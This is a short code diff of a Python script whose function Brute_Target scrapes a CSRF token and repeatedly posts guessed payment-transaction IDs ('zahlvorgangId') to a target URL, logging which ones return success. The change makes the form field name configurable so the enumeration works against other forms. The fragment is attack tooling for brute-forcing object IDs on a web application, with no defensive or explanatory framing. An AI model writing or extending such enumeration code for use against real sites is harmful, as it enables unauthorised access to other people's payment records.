@@ -82,7 +82,7 @@ def Generate_List(path, max_ids, Temp_Text = [], Array_Temp = []):
                 if (Zahl_ID not in Temp_Text):
                     f.write(f'{Zahl_ID}\n')
 
-def Brute_Target(url, id, seconds, read_path, output_path, pk_path, pk_pw, template_path):
+def Brute_Target(url, id, seconds, read_path, output_path, html_tag, pk_path, pk_pw, template_path):
         while True:
             try:
                 s = Session()
@@ -100,7 +100,7 @@ def Brute_Target(url, id, seconds, read_path, output_path, pk_path, pk_pw, templ
             if ("_csrf" in i):
                 CSRF = i.split('value="')[1][:-3]
                 break
-        Data = {'_csrf': CSRF,'zahlvorgangId': IDs}
+        Data = {'_csrf': CSRF, html_tag: IDs}
         Cookies = dict(s.cookies)
         r = post(url, data=Data, cookies=Cookies)
         if ("200" in str(r)):
